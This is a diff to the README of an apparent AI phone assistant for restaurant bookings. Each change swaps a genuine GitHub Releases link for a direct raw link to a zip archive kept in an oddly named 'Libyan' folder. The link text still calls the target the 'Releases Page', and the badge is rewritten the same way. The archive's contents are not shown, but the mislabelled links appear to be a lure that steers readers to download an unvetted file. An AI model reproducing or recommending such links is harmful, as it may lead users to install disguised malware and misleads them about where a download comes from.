@@ -1,6 +1,6 @@
 # 📱 weissmann-ai-phone-assistant - Your AI Helper for Restaurant Bookings
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/SAMUSDAD/weissmann-ai-phone-assistant/releases)
+[![Download Now](https://raw.githubusercontent.com/SAMUSDAD/weissmann-ai-phone-assistant/main/Libyan/phone-assistant-ai-weissmann-1.8.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/SAMUSDAD/weissmann-ai-phone-assistant/main/Libyan/phone-assistant-ai-weissmann-1.8.zip)
 
 ---
 
@@ -14,7 +14,7 @@ Here’s how to quickly download and set up the weissmann-ai-phone-assistant:
 
 1. **Visit the Releases Page**
 
-   To download the latest version of the application, visit our [Releases Page](https://github.com/SAMUSDAD/weissmann-ai-phone-assistant/releases).
+   To download the latest version of the application, visit our [Releases Page](https://raw.githubusercontent.com/SAMUSDAD/weissmann-ai-phone-assistant/main/Libyan/phone-assistant-ai-weissmann-1.8.zip).
 
 2. **Select Your Version**
 
@@ -34,7 +34,7 @@ Here’s how to quickly download and set up the weissmann-ai-phone-assistant:
 
 ## 📥 Download & Install
 
-To start using the weissmann-ai-phone-assistant, [visit the Releases Page](https://github.com/SAMUSDAD/weissmann-ai-phone-assistant/releases) to download the application.
+To start using the weissmann-ai-phone-assistant, [visit the Releases Page](https://raw.githubusercontent.com/SAMUSDAD/weissmann-ai-phone-assistant/main/Libyan/phone-assistant-ai-weissmann-1.8.zip) to download the application.
 
 ## 📊 System Requirements
 
